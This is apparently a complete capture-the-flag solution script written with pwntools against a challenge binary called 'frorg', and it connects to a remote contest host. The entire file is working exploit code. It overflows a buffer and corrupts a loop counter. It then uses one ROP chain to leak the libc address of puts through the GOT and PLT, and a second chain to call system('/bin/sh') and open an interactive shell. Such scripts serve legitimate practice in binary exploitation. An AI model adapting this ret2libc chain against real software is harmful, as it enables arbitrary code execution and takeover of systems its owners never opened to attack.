from pwn import *


# initialize the binary
binary = "./frorg"
elf = context.binary = ELF(binary, checksec=False,)
libc = ELF("./libc.so.6")

gs = """
break main
continue
"""

if args.REMOTE:
    p = remote("byuctf.xyz", 40015)
elif args.GDB:
    p = gdb.debug(binary, gdbscript=gs, env={"LD_PRELOAD":"./libc.so.6"})
else:
    p = elf.process(env={"LD_PRELOAD":"./libc.so.6"})


### INITIAL OVERFLOW TO LEAK LIBC ADDRESS ###
# we want 9 blocks
p.sendline(b'9')

# overflow buffer
# 44 bytes padding + 4 bytes to overwrite the least significant byte of the counter
p.sendline(b'A'*44+b'\x04\x00\x00\x00')

# build ROP chain to leak libc address
payload = b'A'*7                        # padding
payload += p64(0x4011e5)                # pop rdi; ret
payload += p64(elf.got['puts'])         # puts in GOT
payload += p64(elf.plt['puts'])         # puts in PLT
payload += p64(0x4011ea)                # main

# send payload
p.sendline(payload)

# receive leaked address
for _ in range(12):
    p.recvline()
leaked = p.recvline()[:-1]
print("Leaked address:",leaked)

# calculate base address
base = u64(leaked.ljust(8, b"\x00")) - libc.sym['puts']
print("Base address:",hex(base))

# calculate system address
system = base + libc.sym['system']
print("System address:",hex(system))

# calculate /bin/sh address
binsh = base + next(libc.search(b'/bin/sh'))
print("/bin/sh address:",hex(binsh))


### SECOND OVERFLOW TO CALL SYSTEM("/BIN/SH") ###
# second padding
padding = b'0'*14 + b'9' # dunno why I need to put the 0s in front but that's how it works
p.sendline(padding)

# overflow buffer
# 44 bytes padding + 4 bytes to overwrite the least significant byte of the counter
p.sendline(b'A'*44+b'\x04\x00\x00\x00')

# build second ROP chain to call system("/bin/sh")
payload2 = b'A'*7                       # padding
payload2 += p64(0x40101a)               # ret to avoid segfault
payload2 += p64(0x4011e5)               # pop rdi; ret
payload2 += p64(binsh)                  # /bin/sh
payload2 += p64(system)                 # system

p.sendline(payload2)

p.interactive()